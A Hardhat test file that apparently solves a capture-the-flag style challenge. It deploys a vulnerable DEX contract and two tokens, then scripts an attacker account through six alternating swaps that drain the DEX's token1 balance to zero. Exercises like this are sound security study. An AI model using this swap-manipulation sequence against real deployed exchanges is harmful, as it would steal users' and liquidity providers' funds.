const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "Dex";
const SWAP_TOKEN_CONTRACT_NAME = "SwappableToken"
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();
    const Dex = await ethers.getContractFactory(CONTRACT_NAME);
    const dex = await Dex.deploy();

    return { owner, attacker, dex };
  }

  it("Challenge Solved", async function () {
    let {owner, attacker, dex} = await loadFixture(deployLoadFixture)
    let tx;
    // init by creating two tokens, dex receives 100 of each, attacker receives 10 of each.
    const Token = await ethers.getContractFactory(SWAP_TOKEN_CONTRACT_NAME)
    const token1 = await Token.deploy(dex.address, "Token1", "T1", 110)
    await token1.deployed()
    const token2 = await Token.deploy(dex.address, "Token2", "T2", 110)
    await token2.deployed()

    tx = await token1.transfer(dex.address, 100)
    await tx.wait()

    tx = await token1.transfer(attacker.address, 10)
    await tx.wait()

    tx = await token2.transfer(dex.address, 100)
    await tx.wait()

    tx = await token2.transfer(attacker.address, 10)
    await tx.wait()

    await dex.setTokens(token1.address, token2.address)

    // attack
    dex = dex.connect(attacker)

    tx = await dex.approve(dex.address, 400)
    await tx.wait()

    tx = await dex.swap(token1.address, token2.address, 10)
    await tx.wait()

    tx = await dex.swap(token2.address, token1.address, 20)
    await tx.wait()

    tx = await dex.swap(token1.address, token2.address, 24)
    await tx.wait()

    tx = await dex.swap(token2.address, token1.address, 30)
    await tx.wait()

    tx = await dex.swap(token1.address, token2.address, 41)
    await tx.wait()

    tx = await dex.swap(token2.address, token1.address, 45)
    await tx.wait()

    // check
    const dexToken1Balance = await token1.balanceOf(dex.address)
    expect(dexToken1Balance).to.equal(0)

    const attackerToken1Balance = await token1.balanceOf(attacker.address)
    expect(attackerToken1Balance).to.equal(110)

  });
});
